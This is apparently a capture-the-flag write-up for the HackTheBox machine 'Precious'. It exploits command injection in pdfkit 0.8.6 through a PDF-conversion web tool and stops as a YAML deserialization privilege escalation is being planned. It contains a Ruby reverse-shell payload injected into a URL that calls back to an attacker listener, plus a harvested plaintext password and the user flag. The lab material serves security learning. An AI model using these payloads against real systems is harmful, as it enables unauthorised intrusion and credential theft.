We can see ssh and http are open. We also have something called Phusion Passenger on port 80.


### precious.htb

The http site takes us to a "Convert Web Page to PDF" tool.

Let's spin up a python web server with:

```
python3 -m http.server
```

Using our local IP to connect to the python server and tring to download the root page of the web server...sure enough, the tool gives us a PDF file with the directory listing.

Trying to convert a file with an inline `<script>` tag gives us nothing. Seems as though there is some kind of input sanitization.


### pdf file analysis

Analysing the output pdf file from earlier with `exiftool`:

```
$ exiftool out.pdf

```

Interesting... the creator is 'pdfkit v0.8.6'. Let's scour the web for any exploits for this version of pdfkit!


### pdfkit exploit

[This link](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) gives us information about a command injection exploit via ruby, demonstrated by the following example code:

```
PDFKit.new("http://example.com/?name=#{'%20`sleep 5`'}").to_pdf 
# 5 seconds wait... 
```

Let's try this out...sure enough, the page seems to hang for around 5 seconds on submitting the web page!

Time to head to revshells...

 
### Reverse Shell Injection

We read that this exploit was a ruby based exploit. So we spin up a `nc` listener:

```
nc -lnvp 4444
```

and insert a ruby based revshell into our URL like so...

```
http://<LOCALIP>:<LOCALPORT>/?name=%20  {`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("<LOCALIP>",<NCLISTENERPORT>))'`}
```

Clicking submit, we get reverse shell access!


### Directory searching

We find a few files relating to the pdf converter.

Navigating to `/home`, we find there are two users:
1. `ruby` (current user)
2. `henry`

In `henry`'s home directory, we find the `user.txt` flag. cat, head and less don't work on this file do to restrictions. 

Luckily, if we do a quick `whoami`, we find that the current user is `ruby`.
After a bit of searching, we find the file `config` in the `/home/ruby/.bundle` folder. Catting out this file...

```
$ cat config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

We find henry's password! Time to ssh!


### SSH (henry)

Using the password we found for user `henry` from before:

```
$ ssh  henry@10.10.11.189             
henry@10.10.11.189's password: *************
```

Boom! We're in!
Now we can cat the user password!

```
$ cat user.txt
b47ea5d5a17c22a8975f45d7386b1f37
```


### linpeas

Checking what we can run as sudo:

```
$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

So, we can run `/opt/update_dependencies.rb` as root. Let's cat the file...

```
$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

[Hacktricks tells us](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization) that we can perform a deserialization attack via `YAML.load()`.

Let's check the `dependencies.yml` file:
